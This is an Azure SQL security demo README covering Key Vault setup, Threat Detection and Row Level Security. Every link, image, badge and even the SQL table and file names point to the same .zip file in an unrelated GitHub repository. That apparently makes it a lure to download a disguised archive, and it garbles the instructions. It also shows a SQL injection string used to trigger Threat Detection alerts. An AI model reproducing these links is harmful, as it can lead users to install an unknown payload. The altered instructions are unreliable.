...
+ [Powershell with AzureRM and Azure Modules](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip)
...
The following table is an estimation of the cost of deploying the Demo as of 5/9/2016. 
 ...
 --- | --- | ---  
[S1 SQL Database ](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip) |  $30  | $0.04
[B1 App Service Plan](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip) | $55.80  | $0.075
[Storage Plan](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip) | ~$0 | $0.0036/transaction
[Azure Key Vault](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip)| ~$0| $0.03/10k operations 
**Monthly Total** | $85.80/mo | ~$0.115/hr

## Setup
### Generate Application ID and Secret
In order to allow your client application to access and use the keys in your Azure Key Vault, we need to provision an application in Azure Active Directory. This will create a Client ID and Secret that your app will use to authenticate to the Azure Key Vault. To do this, head to the [Classic Azure Portal](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip) and log in.

Select &ldquo;Active Directory&rdquo; in the left sidebar, choose the Active Directory you wish to use (or create a new one if it doesn&rsquo;t exist), then click &ldquo;Applications&rdquo;. If you choose a directory other than your default, you will need to refer to the steps to change the directory associated with your account, [which can be found here](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip). 
...
![Login Example](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip)
...
![User Object ID Example](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip)
...
![Service Principal example](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip)
...
[![Deploy to Azure](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip)](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip)
...
+ You can verify this in the [Azure Portal](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip) by viewing the Database Settings (under **Auditing & Threat Detection**)
...
+ Execute a SQL injection to show Threat Detection on the /patients page
	...
	' ORDER BY SSN -- 
	```
	- Worth saying again: **You _must_ protect against SQL Injection in your app code.** [Learn more about SQL Injection and protecting against it from OWASP.](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip) 
...
+ Check your inbox for a Threat Detection email 
	- From *Microsoft Azure Security Alerts* <https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip> 
...
+ Connect to your deployed database using SSMS: 
	- The server you created will be visible in your [azure portal](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip), it will begin with the string "contososerv"
	- Connect using the Administrator Login (Default was adminLogin) and the password you defined during setup 
	- For more information on using SSMS to connect to an Azure Database, [click here](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip)
...
+ View the data in SSMS (in SSMS use: `SELECT SSN, BirthDate FROM https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip` or `SELECT * FROM https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip` ) 
...
During the creation, we gave the user `create, list, wrapKey, unwrapKey, sign, verify` permissions in order to facilitate your Key Vault management; the application needs `get, wrapKey, unwrapKey, sign, verify`. As a best practice, you should *always follow the principle of least privelege*. For documentation on Key Vault Permissions, see [About Keys and Secrets](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip). 

This is the equivalent of creating a [key vault](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip) and permissions via Powershell- see the section/cmdlets under "Create and Configure a key vault". 
##### Connection String
...
We had to prepare our application to authenticate against our Key Vault- this code is discussed in more detail in this [Blog Post](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip). The code changes referenced there are in our file *https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip*, which can be found [here](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip). 

### Row Level Security (RLS) 

#### Login to the application 
Sign in using (https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip!1) or (https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip!1)

#### Enable Row Level Security (RLS) 
+ Connect to your deployed database using SSMS: [Instructions](https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip)
+ Open https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip ( [Find it here](Security%20Demo%https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip))
...
##### Predicate functions
The predicate functions we created in https://raw.githubusercontent.com/KABUSsport/azure-sql-security-sample/master/src/ContosoClinic/Properties/PublishProfiles/azure-sql-security-sample-v3.0.zip identify users by the `UserId` which was set by our interceptor whenever a connection is established from the application. The two types of predicates we created were **Filter** and **Block**. 
